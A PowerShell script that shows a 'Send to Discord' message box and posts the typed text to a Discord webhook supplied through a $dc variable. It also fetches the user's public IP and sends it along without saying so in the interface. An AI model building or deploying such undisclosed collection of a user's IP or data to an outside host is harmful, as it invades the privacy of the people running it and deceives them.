# Create a simple GUI for inputting text
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Create form
$form = New-Object System.Windows.Forms.Form
$form.Text = "Send to Discord"
$form.Size = New-Object System.Drawing.Size(400, 200)
$form.StartPosition = "CenterScreen"

# Create label
$label = New-Object System.Windows.Forms.Label
$label.Text = "Enter your message:"
$label.Location = New-Object System.Drawing.Point(10, 20)
$label.Size = New-Object System.Drawing.Size(200, 20)
$form.Controls.Add($label)

# Create textbox
$textBox = New-Object System.Windows.Forms.TextBox
$textBox.Location = New-Object System.Drawing.Point(10, 50)
$textBox.Size = New-Object System.Drawing.Size(360, 30)
$form.Controls.Add($textBox)

# Create button
$button = New-Object System.Windows.Forms.Button
$button.Text = "Enter"
$button.Location = New-Object System.Drawing.Point(150, 100)
$button.Size = New-Object System.Drawing.Size(100, 30)
$form.Controls.Add($button)

# Define Discord webhook URL
$discordWebhook = "$dc"  # Replace with your webhook URL

# Get public IP address
function Get-PublicIP {
    try {
        $ip = Invoke-RestMethod -Uri "https://api.ipify.org" -UseBasicParsing
        return $ip
    } catch {
        return "Unknown"
    }
}

# Button click event
$button.Add_Click({
    $message = $textBox.Text
    $ipAddress = Get-PublicIP

    if ([string]::IsNullOrWhiteSpace($message)) {
        [System.Windows.Forms.MessageBox]::Show("Message cannot be empty!", "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
        return
    }

    $body = @{ 
        'username' = "Text bot"
        'content' = "Message: $message`nIP: $ipAddress"
    }

    try {
        Invoke-RestMethod -Uri $discordWebhook -Method Post -ContentType 'application/json' -Body ($body | ConvertTo-Json -Depth 10)
        [System.Windows.Forms.MessageBox]::Show("Message sent successfully!", "Success", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
        $form.Close()
    } catch {
        [System.Windows.Forms.MessageBox]::Show("Failed to send message. Check the webhook URL.", "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
    }
})

# Show the form
[void]$form.ShowDialog()
